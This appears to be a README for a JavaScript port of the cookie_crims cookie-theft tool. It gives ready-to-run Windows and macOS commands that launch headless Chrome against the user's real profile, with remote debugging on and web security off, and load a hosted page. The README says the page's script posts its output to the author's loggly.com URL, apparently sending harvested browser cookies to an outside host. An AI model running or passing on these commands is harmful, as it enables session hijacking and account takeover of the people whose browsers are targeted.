This is a javascript implementation of the cookie_crims tool by @mangopdf

Running the command below will run the javascript found in the index.html file in this repo which has been setup using Github Pages. It is currently harcoded to post the script output to my own loggly.com URL. Host is on your own github to control the script completely.

# Windows

```"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir=%localAppData%"\Google\Chrome\User Data\Default" https://clr2of8.github.io/TestCC/```

# OS X

```"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --headless --remote-debugging-port=9222 --disable-web-security --user-data-dir="$HOME/Library/Application Support/Google/Chrome" https://clr2of8.github.io/TestCC/```
